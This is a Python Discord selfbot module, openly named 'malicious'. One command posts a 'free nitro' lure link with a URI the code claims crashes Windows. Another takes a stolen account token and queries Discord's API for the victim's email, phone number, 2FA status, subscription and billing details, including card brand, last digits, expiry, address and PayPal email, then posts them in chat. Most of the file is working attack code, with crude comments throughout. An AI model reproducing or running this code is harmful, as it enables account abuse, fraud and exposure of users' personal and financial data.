import discord
import asyncio
from discord.ext import commands
import requests
import json
import urllib.request, json
from datetime import datetime
from colorama import Fore, init


class malicious(commands.Cog):
    """Uhhh discord coding is shit"""

    def __init__(self, bot):
        self.bot = bot

   
    @commands.command()
    async def fatal(self, ctx):
        """Sends a link when clicked rapes a windwos computer"""
        await ctx.message.delete()
        await ctx.send("Click this for free nitro! <ms-cxh-full://0>")


    @commands.command()
    async def tokeninfo(self, ctx, message):
        """Grabs info about selected user including billing info ¯\_(ツ)_/¯

        Paramaters
        • token - token of the selected user
        """
        token = message
        await ctx.message.edit(content="Grabbing info...")

        try:
            headers = {"Authorization": token, "Content-Type": "application/json"}
            ### attempt login
            res = requests.get(
                "https://discordapp.com/api/v6/users/@me", headers=headers
            )

            if res.status_code == 200:  # code 200 if valid
                print(
                    f"{Fore.GREEN}[-] {Fore.RESET}Token is valid attemptig to grab info..."
                )

                ##################################################
                #                                                #
                # Get's the user info.                           #
                # Credits to wodxgod for the code                #
                # Check out his repository for token info here:  #
                # https://github.com/wodxgod/DTI                 #
                #                                                #
                ##################################################

                ### Defines languages for getting locales but in english and not
                ### This shitty ass en-GB shit
                languages = {
                    "da": "Danish, Denmark",
                    "de": "German, Germany",
                    "en-GB": "English, United Kingdom",
                    "en-US": "English, United States",
                    "es-ES": "Spanish, Spain",
                    "fr": "French, France",
                    "hr": "Croatian, Croatia",
                    "lt": "Lithuanian, Lithuania",
                    "hu": "Hungarian, Hungary",
                    "nl": "Dutch, Netherlands",
                    "no": "Norwegian, Norway",
                    "pl": "Polish, Poland",
                    "pt-BR": "Portuguese, Brazilian, Brazil",
                    "ro": "Romanian, Romania",
                    "fi": "Finnish, Finland",
                    "sv-SE": "Swedish, Sweden",
                    "vi": "Vietnamese, Vietnam",
                    "tr": "Turkish, Turkey",
                    "cs": "Czech, Czechia, Czech Republic",
                    "el": "Greek, Greece",
                    "bg": "Bulgarian, Bulgaria",
                    "ru": "Russian, Russia",
                    "uk": "Ukranian, Ukraine",
                    "th": "Thai, Thailand",
                    "zh-CN": "Chinese, China",
                    "ja": "Japanese",
                    "zh-TW": "Chinese, Taiwan",
                    "ko": "Korean, Korea",
                }

                ### Vars for later when figuring out card
                cc_digits = {"american express": "3", "visa": "4", "mastercard": "5"}

                res_json = res.json()

                ### Convert json response to args we can fucking use
                user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                user_id = res_json["id"]
                avatar_id = res_json["avatar"]
                avatar_url = (
                    f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif"
                )
                phone_number = res_json["phone"]
                email = res_json["email"]
                mfa_enabled = res_json["mfa_enabled"]
                flags = res_json["flags"]
                locale = res_json["locale"]
                verified = res_json["verified"]

                ### Takes locale shit from earlier and converts into e.g Bulgarian, Bulgaria
                language = languages.get(locale)
                creation_date = datetime.utcfromtimestamp(
                    ((int(user_id) >> 22) + 1420070400000) / 1000
                ).strftime("%d-%m-%Y %H:%M:%S UTC")

                ### By default assume no nitro
                has_nitro = False

                print(
                    f"{Fore.GREEN}[-] {Fore.RESET}Initial account checks done\n{Fore.GREEN}[-] {Fore.RESET}Attempting to grab nitro information"
                )
                ### Yoink nitro info
                res = requests.get(
                    "https://discordapp.com/api/v6/users/@me/billing/subscriptions",
                    headers=headers,
                )
                nitro_data = res.json()
                has_nitro = bool(len(nitro_data) > 0)
                if has_nitro:
                    d1 = datetime.strptime(
                        nitro_data[0]["current_period_end"].split(".")[0],
                        "%Y-%m-%dT%H:%M:%S",
                    )
                    d2 = datetime.strptime(
                        nitro_data[0]["current_period_start"].split(".")[0],
                        "%Y-%m-%dT%H:%M:%S",
                    )
                    days_left = abs((d2 - d1).days)
                print(
                    f"{Fore.GREEN}[-] {Fore.RESET}Nitro information gotten moving to billing info"
                )
                ### Yoink billing info lmap
                billing_info = []
                for x in requests.get(
                    "https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                    headers=headers,
                ).json():
                    y = x["billing_address"]
                    name = y["name"]
                    address_1 = y["line_1"]
                    address_2 = y["line_2"]
                    city = y["city"]
                    postal_code = y["postal_code"]
                    state = y["state"]
                    country = y["country"]

                    ### Check if billing = CC or PP
                    if x["type"] == 1:
                        print(
                            f"{Fore.GREEN}[-] {Fore.RESET}Credit card linked! Attempting to grab info"
                        )
                        cc_brand = x["brand"]
                        cc_first = cc_digits.get(cc_brand)
                        cc_last = x["last_4"]
                        cc_month = str(x["expires_month"])
                        cc_year = str(x["expires_year"])

                        data = {
                            "Payment Type": "Credit Card",
                            "Valid": not x["invalid"],
                            "CC Holder Name": name,
                            "CC Brand": cc_brand.title(),
                            "CC Number": "".join(
                                z if (i + 1) % 2 else z + " "
                                for i, z in enumerate(
                                    (cc_first if cc_first else "*")
                                    + ("*" * 11)
                                    + cc_last
                                )
                            ),
                            "CC Exp. Date": (
                                "0" + cc_month if len(cc_month) < 2 else cc_month
                            )
                            + "/"
                            + cc_year[2:4],
                            "Address 1": address_1,
                            "Address 2": address_2 if address_2 else "",
                            "City": city,
                            "Postal Code": postal_code,
                            "State": state if state else "",
                            "Country": country,
                            "Default Payment Method": x["default"],
                        }

                    elif x["type"] == 2:
                        print(
                            f"{Fore.GREEN}[-] {Fore.RESET}PayPal linked! Attempting to grab info"
                        )
                        data = {
                            "Payment_Type": "PayPal",
                            "Valid": not x["invalid"],
                            "PayPal Name": name,
                            "PayPal Email": x["email"],
                            "Address 1": address_1,
                            "Address 2": address_2 if address_2 else "",
                            "City": city,
                            "Postal Code": postal_code,
                            "State": state if state else "",
                            "Country": country,
                            "Default Payment Method": x["default"],
                        }
                    billing_info.append(data)

                    await ctx.send(
                        f"""```
Basic Information
-----------------
    Username               {user_name}
    User ID                {user_id}
    Creation Date          {creation_date}
    Avatar URL             {avatar_url if avatar_id else ""}
    Token                  {token}


Nitro Information
-----------------
    Nitro Status           {has_nitro}
    {f"Expires in          {days_left} day(s)" if has_nitro else ""}


Billing Information
-------------------
    Billing info in json because I'm a lazy fuck

    {billing_info}

    # NOTE: I WILL FIX THIS JUST NOT NOW PROBABLY NEVER LMAO


Contact Information
-------------------
    Phone number           {phone_number if phone_number else "N/A"}
    Email                  {email if email else "N/A"}

Account Security
----------------
    2FA/MFA Enabled        {mfa_enabled}
    Flags                  {flags}


Other
-----
    Locale                 {locale} {language}
    Email Verified         {verified}


Quite possibly the shittest selfbot made by Daddie#1337```"""
                    )

            elif res.status_code == 401:
                await ctx.send(":x:\n**Error:** Invalid token was provided (401)")

            else:
                await ctx.send(
                    "There seems to be an error looking up that token\nDouble check your token and try again"
                )
        except Exception as e:
            uhhh = "Honestly dont know what you fucked up I don't care lmao"
            await ctx.send(f":x:\n**Error:** {uhhh}\n\n{e}")


### Discord blockbypass coming soon. Creds to Yaekith for that shit
def setup(bot):
    bot.add_cog(malicious(bot))
